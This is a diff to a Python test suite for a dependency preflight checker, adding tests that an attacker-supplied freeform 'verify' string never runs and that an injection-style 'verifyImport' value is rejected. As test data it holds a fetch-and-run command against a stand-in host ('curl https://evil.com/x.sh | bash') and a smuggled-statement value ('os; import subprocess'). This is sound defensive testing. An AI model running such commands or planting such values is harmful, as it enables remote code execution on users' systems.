@@ -65,12 +65,15 @@ def _setup_repo(repo: Path, deps: list[dict]) -> tuple[Path, Path]:
     return mp, ap
 
 
-# Minimal pip dep used across multiple tests
+# Minimal pip dep used across multiple tests.
+# `verifyImport` is the STRUCTURED presence check (built into a safe argv); the
+# freeform `verify` string is retained to prove it is NEVER executed (demoted, like `install`).
 _PIP_DEP = {
     "name": "requests",
     "manager": "pip",
     "package": "requests",
     "version": "2.31.0",
+    "verifyImport": "requests",
     "verify": "python -c 'import requests'",
     "source": "pypi",
     "scope": "project-local",
@@ -563,6 +566,44 @@ class TestFreeformInstallNeverRun:
         assert install_call[0] == "pip"
         assert "requests==2.31.0" in install_call
 
+    def test_freeform_verify_string_not_executed(self, repo: Path, fake_home: Path):
+        """BLOCKER (holistic red-team): the freeform ``verify`` string is NEVER run.
+
+        Presence is checked only via the STRUCTURED ``verifyImport`` (a validated
+        identifier compiled into ``python -c "import <name>"``). An attacker-supplied
+        ``verify`` shell string must never reach the runner.
+        """
+        dep = dict(_PIP_DEP)
+        dep["verifyImport"] = "requests"
+        dep["verify"] = "curl https://evil.com/x.sh | bash"  # must NEVER run
+        mp, ap = _setup_repo(repo, [dep])
+        runner = _TrackingRunner(default=(0, "ok"))  # verify (import) passes → present
+        result = pf.run_preflight(
+            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
+            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
+        )
+        assert result["status"] == "ready"
+        for call in runner.calls:
+            call_str = " ".join(call)
+            assert "curl" not in call_str, f"freeform verify executed: {call}"
+            assert "evil.com" not in call_str
+            assert "bash" not in call_str
+        # The only call is the structured import check
+        assert runner.calls == [["python", "-c", "import requests"]]
+
+    def test_malicious_verifyimport_blocked_not_executed(self, repo: Path, fake_home: Path):
+        """A ``verifyImport`` that isn't a clean identifier is rejected (no execution)."""
+        dep = dict(_PIP_DEP)
+        dep["verifyImport"] = "os; import subprocess"  # injection attempt
+        mp, ap = _setup_repo(repo, [dep])
+        runner = _TrackingRunner(default=(0, "ok"))
+        result = pf.run_preflight(
+            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
+            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
+        )
+        assert result["status"] == "blocked"
+        assert runner.calls == []  # rejected before any execution
+
 
 # ---------------------------------------------------------------------------
 # run_preflight — Snyk SCA pre-install gate
@@ -1052,7 +1093,7 @@ def test_mutation_prove_non_vacuous():
 def test_mutation_prove_colon_guard():
     """Prove the per-manager name-grammar guard in ``_validate_package`` bites.
 
-    Line mutated: ``if not pkg_re.match(package):``.
+    Line mutated: ``if not pkg_re.fullmatch(package):``.
     The colon-only attack vector ``foo:bar`` passes all universal checks
     (no ``://``, no ``git+``, no ``http``, no ``..``, no leading ``-``) but is
     caught ONLY by the per-manager regex (``:``) is not in any manager's grammar).
@@ -1063,7 +1104,7 @@ def test_mutation_prove_colon_guard():
     import mutation_run
 
     source = str(_Path(__file__).resolve().parent.parent / "kata_preflight.py")
-    asserted_line = '    if not pkg_re.match(package):'
+    asserted_line = '    if not pkg_re.fullmatch(package):'
     test_cmd = (
         f'cd "{_Path(__file__).resolve().parent.parent}" && '
         f'{sys.executable} -m pytest '
